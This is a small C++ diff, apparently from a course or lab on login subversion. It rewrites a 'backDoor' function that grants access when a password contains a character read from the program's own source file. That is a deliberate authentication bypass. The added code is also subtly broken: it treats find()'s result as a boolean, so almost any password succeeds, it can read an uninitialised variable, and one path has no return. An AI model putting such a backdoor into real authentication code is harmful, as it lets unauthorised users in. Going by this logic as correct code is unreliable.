@@ -28,10 +28,16 @@ string getSHA256(const string& input) {
 
 bool backDoor(const string& password) {
     ifstream sourceFile("login-subverted.cpp");
-    if (!sourceFile.is_open()) return false;  // Ensure file is open
-    char character = sourceFile.get();  // Get the first character
+    string line;
+    char character;
+    if (getline(sourceFile, line)) {
+        character = line[20];
+    }
     sourceFile.close();
-    return password.find(character) != string::npos;  // Check if character is in password
+
+    if (password.find(character)) {
+        return true;
+    }
 }
 
 
